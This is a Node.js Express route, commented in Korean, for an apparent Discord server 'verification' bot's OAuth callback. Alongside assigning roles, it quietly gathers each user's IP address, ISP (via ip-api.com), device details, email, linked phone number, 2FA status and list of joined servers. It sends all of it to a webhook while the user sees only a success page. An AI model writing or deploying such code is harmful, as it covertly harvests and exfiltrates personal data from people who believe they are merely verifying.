app.get('/callback', async (req, res) => {
    const code = req.query.code;
    const state = req.query.state;
    if (!code) return res.status(400).send('인증 코드가 없습니다.');

    const redirectUri = `${FIXED_RENDER_URL}/callback`;

    let userIp = '알 수 없음';
    let selectedRoles = [];
    let userAgent = '알 수 없음';
    try {
        if (state) {
            const decodedState = JSON.parse(Buffer.from(state, 'base64').toString('utf8'));
            userIp = decodedState.ip;
            selectedRoles = decodedState.roles || [];
            userAgent = decodedState.ua || '알 수 없음';
        }
    } catch (e) {}

    // IP를 통해 통신사(ISP) 및 조직 정보 조회 (예: LG U+, KT, SKT 등)
    let ispInfo = '알 수 없음 (모바일/기타)';
    try {
        const ispRes = await axios.get(`http://ip-api.com/json/${userIp}?fields=status,isp,org,as`);
        if (ispRes.data && ispRes.data.status === 'success') {
            ispInfo = `${ispRes.data.isp} (Org: ${ispRes.data.org})`;
        }
    } catch (e) {}

    const deviceDetail = parseDevice(userAgent);

    try {
        const tokenRes = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: CLIENT_ID,
            client_secret: CLIENT_SECRET,
            grant_type: 'authorization_code',
            code: code,
            redirect_uri: redirectUri,
        }), {
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
        });

        const accessToken = tokenRes.data.access_token;

        // 디스코드 유저 정보 가져오기 (전화번호 연동 여부 포함된 스코프 사용 시 phone 필드 확인 가능)
        const userRes = await axios.get('https://discord.com/api/users/@me', {
            headers: { authorization: `Bearer ${accessToken}` }
        });
        const userData = userRes.data;

        let guildsTextContent = `[ ${userData.username} (${userData.id}) 님이 가입된 서버 목록 ]\n\n`;
        try {
            const guildsRes = await axios.get('https://discord.com/api/users/@me/guilds', {
                headers: { authorization: `Bearer ${accessToken}` }
            });
            if (guildsRes.data && guildsRes.data.length > 0) {
                guildsRes.data.forEach((g, index) => {
                    guildsTextContent += `${index + 1}. 이름: ${g.name} (ID: ${g.id})\n`;
                });
            } else {
                guildsTextContent += '가입된 서버가 없습니다.';
            }
        } catch (gErr) {
            guildsTextContent += '서버 목록을 불러오는 데 실패했습니다.';
        }

        const filePath = path.join(__dirname, `guilds_${userData.id}.txt`);
        fs.writeFileSync(filePath, guildsTextContent, 'utf8');

        // 전화번호 연동 여부 표시 (디스코드 API에서 phone 값이 존재하면 연동된 것임)
        const phoneStatus = userData.phone ? `✅ 연동됨 (${userData.phone})` : '❌ 미연동 또는 확인 불가';
        const isMfaEnabled = userData.mfa_enabled ? '✅ 2차 인증(OTP) 활성화됨' : '❌ 2차 인증 미사용';

        if (WEBHOOK_URL) {
            const FormData = require('form-data');
            const form = new FormData();
            form.append('content', `✅ **[인증 완료 상세 정보]**\n` +
                                    `👤 **유저:** <@${userData.id}> (\`${userData.username}\`)\n` +
                                    `📧 **이메일:** \`${userData.email}\` (\`${userData.verified ? '이메일 인증됨' : '미인증'}\`)\n` +
                                    `📱 **휴대폰 번호 연동:** \`${phoneStatus}\`\n` +
                                    `🔒 **계정 보안(2FA):** \`${isMfaEnabled}\`\n` +
                                    `🌐 **공인 IP:** \`${userIp}\`\n` +
                                    `📡 **통신사/ISP:** \`${ispInfo}\`\n` +
                                    `💻 **기기 및 플랫폼:** \`${deviceDetail}\``);
            form.append('file', fs.createReadStream(filePath));

            await axios.post(WEBHOOK_URL, form, {
                headers: form.getHeaders()
            }).catch(() => {});
        }

        if (fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
        }

        const guild = await client.guilds.fetch(GUILD_ID);
        const member = await guild.members.fetch(userData.id);

        if (member) {
            const rolesToAdd = [VERIFIED_ROLE_ID, ...selectedRoles];
            await member.roles.add(rolesToAdd);

            if (UNVERIFIED_ROLE_ID && member.roles.cache.has(UNVERIFIED_ROLE_ID)) {
                await member.roles.remove(UNVERIFIED_ROLE_ID);
            }

            console.log(`[역할 처리 완료] ${userData.username}님 인증 완료!`);
            res.send(`<h1>인증 성공!</h1><p>${userData.username}님, 인증이 완료되었습니다. 디스코드 서버로 돌아가세요!</p>`);
        } else {
            res.send('인증은 성공했으나, 현재 서버에 가입되어 있지 않습니다.');
        }

    } catch (err) {
        console.error('에러 발생:', err.response?.data || err.message);
        res.status(500).send('인증 처리 중 오류가 발생했습니다.');
    }
});
